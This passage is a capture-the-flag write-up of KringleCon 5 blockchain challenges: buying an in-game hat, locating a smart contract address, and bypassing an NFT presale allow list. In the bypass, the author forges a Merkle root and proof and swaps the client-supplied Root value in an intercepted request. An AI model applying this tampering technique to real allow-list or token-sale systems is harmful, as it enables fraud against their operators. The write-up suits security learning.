<p>We need to interact with a vending machine and buy a hat with KringleCoins (<em>KC</em>), a custom cryptocurrency. All along the challenges, each time we completed one, we received KringleCoins on the wallet that we had to create before starting the game. There are <em>KTM</em>s (KringleCoin Teller Machines) in some locations that we can use to check the balance of our wallet, to pre-approve a transfer or simply test our wallet secret key.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_01.webp" alt="KringleCoin Teller Machines" data-caption="KringleCoin Teller Machines" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KringleCoin Teller Machines
      
        
        
      
    </figcaption>
  
</figure>
<p>In the hat vending machine, we need to first choose a hat to buy…there are hundreds. Each hat has a cost of 10 <em>KC</em>, an <em>ID</em> and a linked wallet:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_02.webp" alt="Hat vending machine" data-caption="Hat vending machine" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Hat vending machine
      
        
        
      
    </figcaption>
  
</figure>
<p>Once we have chosen a hat, we need first to pre-approve the financial transaction in a <em>KTM</em> using the information shown above and our wallet private key:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_03.webp" alt="KTM - Approve Transfer" data-caption="KTM - Approve Transfer" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KTM - Approve Transfer
      
        
        
      
    </figcaption>
  
</figure>
<p>Now back to the vending machine to finalize the purchase:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_04.webp" alt="Hat vending machine - purchase" data-caption="Hat vending machine - purchase" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Hat vending machine - purchase
      
        
        
      
    </figcaption>
  
</figure>
<p>We get the hat in our inventory and our avatar can wear it.</p>
<h4 id="52-blockchain-divination">5.2 Blockchain Divination</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>4/5</td>
<td>Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels.</td>
<td>Burning Ring of Fire</td>
</tr>
</tbody>
</table>
<p>We have access to a <a href="https://prod-blockbrowser.kringle.co.in"><em>Blockchain Viewer</em></a> to explore the chain on which all the <em>KringleCoin</em> transactions are held. We can view for instance the 2 transactions that were done to buy our hat. We can see the transfer pre-approval on block <code>107686</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_05.webp" alt="Transaction - block 107686" data-caption="Transaction - block 107686" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Transaction - block 107686
      
        
        
      
    </figcaption>
  
</figure>
<p>And the actual purchase on block <code>107693</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_06.webp" alt="Transaction - block 107693" data-caption="Transaction - block 107693" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Transaction - block 107693
      
        
        
      
    </figcaption>
  
</figure>
<p>We see as well that each time we validated a challenge and got <em>KringleCoins</em>, there was a transaction on the user&rsquo;s wallet:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_07.webp" alt="Transaction - Challenge validation" data-caption="Transaction - Challenge validation" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Transaction - Challenge validation
      
        
        
      
    </figcaption>
  
</figure>
<p>However, to complete this challenge we only have to answer one question: &ldquo;At what address is the <em>KringleCoin</em> smart contract deployed?&rdquo;</p>
<p>As this must have been done at the very beginning of the chain, let&rsquo;s look for the first blocks. The block 0 does not contain any transaction. But the next block is where the smart contract was deployed.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_08.webp" alt="Transaction - block 1" data-caption="Transaction - block 1" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Transaction - block 1
      
        
        
      
    </figcaption>
  
</figure>
<p>The smart contract is written in the <em>Solidity</em> language and we can read its source code in the same block. It defines all methods to handle the cryptocurrency transactions:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_09.webp" alt="KringleCoin.sol" data-caption="KringleCoin.sol" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KringleCoin.sol
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</code></p>
<h4 id="53-exploit-a-smart-contract">5.3 Exploit a Smart Contract</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>5/5</td>
<td>Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.</td>
<td>Burning Ring of Fire</td>
</tr>
</tbody>
</table>
<p>We have acces to <a href="https://boredsporcrowboatsociety.com">https://boredsporcrowboatsociety.com</a> that is used to sell <em>NFT</em>s.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_10.webp" alt="The Bored Sporc Rowboat Society" data-caption="The Bored Sporc Rowboat Society" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      The Bored Sporc Rowboat Society
      
        
        
      
    </figcaption>
  
</figure>
<p>The gallery shows the list of <em>NFT</em>s that have already been purchased, their owner and their current value:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_11.webp" alt="Gallery" data-caption="Gallery" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Gallery
      
        
        
      
    </figcaption>
  
</figure>
<p>There is a presale page as well where only a few selected members of the club are able to purchase <em>NFT</em>s at a very low price. In order to verify if we are in the presale list, we need to provide our wallet address and one or more proof values that were given to us. Of course we are not part of the selected ones.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_12.webp" alt="Presale" data-caption="Presale" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Presale
      
        
        
      
    </figcaption>
  
</figure>
<p>The goal of this challenge is to enter the presale approved list and purchase an <em>NFT</em>s at a lower price.</p>
<p>We are given a few hint on how to achieve that:</p>
<ul>
<li>a website that explains what is a <a href="https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/">Merkle Tree</a></li>
<li>a talk from <a href="https://youtu.be/Qt_RWBq63S8">Professor Petabyte</a></li>
<li>a Github <a href="https://github.com/QPetabyte/Merkle_Trees">repository</a></li>
</ul>
<p>A <em>Merkle Tree</em> is a hash tree that has multiple use cases but the one that interests us here is to prove that some data is included in a list. All is very well explained in the above links. We understand that the presale allow list verification uses a <em>Merkle Tree</em> to check if our wallet is part of that list.</p>
<p>If we look at the call that is done when we try to verify our wallet, we see that the following payload is sent:</p>
<div class="box">{<br />
  &ldquo;WalletID&rdquo;:&ldquo;0x5E2d75Fe1057066b1Ef4eCA612b526bAfC8C2b0D&rdquo;,&ldquo;Root&rdquo;:&ldquo;0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1&rdquo;,<br />
  &ldquo;Proof&rdquo;:&ldquo;111111111111111111111111111111111&rdquo;,<br />
  &ldquo;Validate&rdquo;:&ldquo;true&rdquo;,<br />
  &ldquo;Session&rdquo;:&ldquo;919f7b3a-0ac8-4ce1-b3cb-825421a222a8&rdquo;<br />
}</div>
<p>The <code>Root</code> value is constant and represents the root value of the calculated <em>Merkle Tree</em>. Basically, the wallets in the allow list and our own wallet are nodes of the hash tree. The root of the tree is calculated with those values and if the result equals the <code>Root</code> value, we are allowed in the list.</p>
<p>As we have the control of this <code>Root</code> value in the verification call, it means that we can:</p>
<ul>
<li>take the wallet address of someone already in the list (e.g the first <em>NFT</em> owner address in the gallery)</li>
<li>take our wallet address</li>
<li>calculate the resulting root and proof value</li>
<li>provide all those information to the webserver!</li>
</ul>
<p>This Github <a href="https://github.com/QPetabyte/Merkle_Trees">repository</a> does exactly that, let&rsquo;s use it!</p>
<div class="box">$ git clone <a href="https://github.com/QPetabyte/Merkle_Trees.git">https://github.com/QPetabyte/Merkle_Trees.git</a><br />
$ cd Merkle_Trees<br />
$ chmod +x merkle_tree.py<br />
$ pip3 install -r requirements.txt</div>
<p>We just need to replace the values in the <code>allowlist</code> list by our 2 values in the <code>merkle_tree.py</code> script:</p>
<ul>
<li>0x5E2d75Fe1057066b1Ef4eCA612b526bAfC8C2b0D our wallet (make sure to put it first in the list)</li>
<li>0xa1861E96DeF10987E1793c8f77E811032069f8E9 the wallet of someone in the list</li>
</ul>
<p>We run the script and we get the following result:</p>
<div class="box">Root: 0xdec160a936cf1ca34ce847d53e64de0798963a2285591f246881fb93600c639a<br />
Proof: [&lsquo;0x3ca7b0f306be105d5e5b040af0e2bc35fb95026afcd89f726e8e94994c312f79&rsquo;]</div>
<p>Now we only have to enter our wallet address and the proof in the verification form. Intercept the <em>POST</em> call and replace the <code>Root</code> value with our own to be allowed in the presale list:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_13.webp" alt="Presale allow list" data-caption="Presale allow list" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Presale allow list
      
        
        
      
    </figcaption>
  
</figure>
<p>The last thing to do to be able to purchase our <em>NFT</em> is to go back to a <em>KTM</em> to pre-approve the purchase as explained in the presale webpage. Then back to the presale webpage to finalize the purchase of our very first <em>NFT</em>!</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_14.webp" alt="NFT Purchase" data-caption="NFT Purchase" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      NFT Purchase
      
        
        
      
    </figcaption>
  
</figure>
<p>We can see our transaction in the chain. The block 87391 is the pre-approval:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_15.webp" alt="Blockchain - block 87391" data-caption="Blockchain - block 87391" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Blockchain - block 87391
      
        
        
      
    </figcaption>
  
</figure>
<p>The block 87408 is the actual <em>NFT</em> purchase:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_16.webp" alt="Blockchain - block 87408" data-caption="Blockchain - block 87408" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Blockchain - block 87408
      
        
        
      
    </figcaption>
  
</figure>
<p>And finally our <em>NTF</em> is:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj05_17.webp" alt="Purchased NFT" data-caption="Purchased NFT" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='40%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:40%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Purchased NFT
      
        
        
      
    </figcaption>
  
</figure>
<h2 id="loot-boxes">Loot Boxes</h2>
<p>All along the path to the rings, we can find 6 hidden loot boxes containing additional hints and coins. Here are their location.</p>
<table>
<thead>
<tr>
<th>Number</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><figure >
  
  
  
    <img data-src="/images/kringlecon5/lootboxes/loot1.webp" alt="loot box 1" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>2</td>
<td><figure >
  
  
  
    <img data-src="/images/kringlecon5/lootboxes/loot2.webp" alt="loot box 2" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>3</td>
<td><figure >
  
  
  
    <img data-src="/images/kringlecon5/lootboxes/loot3.webp" alt="loot box 3" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>4</td>
<td><figure >
  
  
  
    <img data-src="/images/kringlecon5/lootboxes/loot4.webp" alt="loot box 4" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>5</td>
<td><figure >
  
  
  
    <img data-src="/images/kringlecon5/lootboxes/loot5.webp" alt="loot box 5" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>6</td>
<td><figure >
  
  
  
